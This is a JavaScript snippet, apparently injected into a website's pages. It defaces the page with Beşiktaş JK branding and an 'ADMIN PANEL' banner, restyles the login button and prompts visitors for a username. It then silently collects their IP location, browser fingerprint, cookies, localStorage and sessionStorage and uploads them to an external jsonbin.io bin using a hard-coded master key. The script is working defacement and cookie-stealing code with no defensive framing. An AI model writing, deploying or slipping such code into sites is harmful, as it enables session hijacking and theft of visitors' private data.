<script>
(async () => {
  const body = document.body;
  body.style.backgroundImage = "url('https://upload.wikimedia.org/wikipedia/tr/2/22/Besiktas_CJK.png')";
  body.style.backgroundSize = "cover";
  body.style.backgroundRepeat = "no-repeat";
  body.style.backgroundPosition = "center";
  body.style.transition = "background-color 0.5s, color 0.5s";

  let isDarkMode = true;
  body.style.backgroundColor = '#000000';
  body.style.color = '#FFFFFF';

  const logo = document.querySelector('img');
  if (logo) {
    logo.src = 'https://upload.wikimedia.org/wikipedia/commons/2/20/Logo_of_Be%C5%9Fikta%C5%9F_JK.svg';
    logo.style.width = '150px';
    logo.style.border = '3px solid white';
  }

  document.querySelectorAll('h1,h2,h3,h4,h5').forEach(el => el.textContent = 'Resmi Sayfa');

  const loginButton = document.querySelector('button[type="submit"]');
  if (loginButton) {
    loginButton.textContent = 'Giriş Yap';
    loginButton.style.backgroundColor = '#000000';
    loginButton.style.color = '#FFFFFF';
    loginButton.style.fontWeight = '600';
    loginButton.style.border = '2px solid white';
    loginButton.style.cursor = 'pointer';
  }

  const adminPanelLabel = document.createElement('div');
  adminPanelLabel.textContent = "ADMIN PANEL";
  Object.assign(adminPanelLabel.style, {
    position: 'fixed',
    top: '50px',
    left: '50%',
    transform: 'translateX(-50%)',
    fontWeight: '700',
    fontSize: '22px',
    padding: '6px 15px',
    borderRadius: '12px',
    zIndex: '99999',
    userSelect: 'none',
    transition: 'color 0.5s, background-color 0.5s',
    cursor: 'default',
  });

  function updateAdminPanelColors() {
    if (isDarkMode) {
      adminPanelLabel.style.color = "#FFFFFF";
      adminPanelLabel.style.backgroundColor = "rgba(0,0,0,0.7)";
      adminPanelLabel.style.textShadow = "0 0 5px #FFFFFF";
    } else {
      adminPanelLabel.style.color = "#000000";
      adminPanelLabel.style.backgroundColor = "rgba(255,255,255,0.8)";
      adminPanelLabel.style.textShadow = "0 0 3px #000000";
    }
  }
  updateAdminPanelColors();
  document.body.appendChild(adminPanelLabel);

  setInterval(() => {
    isDarkMode = !isDarkMode;
    body.style.backgroundColor = isDarkMode ? '#000000' : '#FFFFFF';
    body.style.color = isDarkMode ? '#FFFFFF' : '#000000';
    updateAdminPanelColors();
  }, 20000);

  function flyEagle() {
    const eagle = document.createElement('img');
    eagle.src = 'https://upload.wikimedia.org/wikipedia/commons/2/20/Logo_of_Be%C5%9Fikta%C5%9F_JK.svg';
    Object.assign(eagle.style, {
      position: 'fixed',
      top: '50%',
      left: '-200px',
      width: '100px',
      transition: 'left 5s linear',
      zIndex: '9999'
    });
    document.body.appendChild(eagle);
    setTimeout(() => { eagle.style.left = '110%'; }, 100);
    setTimeout(() => { eagle.remove(); }, 5100);
  }
  flyEagle();
  setInterval(flyEagle, 30000);

  function displayScore() {
    const score = Math.floor(Math.random() * 100);
    let highestScore = localStorage.getItem('highestScore') || 0;
    if (score > highestScore) {
      localStorage.setItem('highestScore', score);
      console.log(`Yeni rekor: ${score}`);
    } else {
      console.log(`Skor: ${score}. Rekor: ${highestScore}`);
    }
  }
  displayScore();

  const userName = prompt("Lütfen kullanıcı adınızı giriniz:");
  if (userName) {
    const welcome = document.createElement('h2');
    welcome.textContent = `Hoşgeldiniz, ${userName}`;
    welcome.style.color = isDarkMode ? '#FFFFFF' : '#000000';
    welcome.style.textAlign = 'center';
    welcome.style.marginTop = '10px';
    document.body.prepend(welcome);
  }

  async function getIpLocation() {
    try {
      const res = await fetch('https://ipapi.co/json/');
      return await res.json();
    } catch {
      return null;
    }
  }
  const locationData = await getIpLocation();

  function collectData() {
    return {
      userName: userName || null,
      timestamp: new Date().toISOString(),
      location: locationData,
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
      },
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      javaEnabled: navigator.javaEnabled(),
      onlineStatus: navigator.onLine,
    };
  }

  // 🔐 JSONBIN.IO ENTEGRASYONU
  const apiKey = '$2a$10$WyBCjBNDWR47OqW/NsfqL...udbAialXkiuFTkWYLM7qQWa7G/A6m';
  const binId = '6874d568355eab5e8b1b13a3';

  async function getDataFromJsonBin() {
    const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
      headers: { 'X-Master-Key': apiKey }
    });
    const json = await res.json();
    return json.record || {};
  }

  async function sendDataToJsonBin(newData) {
    const currentData = await getDataFromJsonBin();
    const users = Array.isArray(currentData.users) ? currentData.users : [];
    users.push(newData);

    const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-Master-Key': apiKey
      },
      body: JSON.stringify({ users })
    });

    if (!res.ok) {
      console.error('Veri gönderme başarısız:', res.statusText);
    } else {
      console.log('Veri başarıyla gönderildi.');
    }
  }

  const dataToSend = collectData();
  await sendDataToJsonBin(dataToSend);

  setTimeout(async () => {
    const received = await getDataFromJsonBin();
    console.log('Jsonbin’den alınan veri:', received);
  }, 1000);
})();
</script>

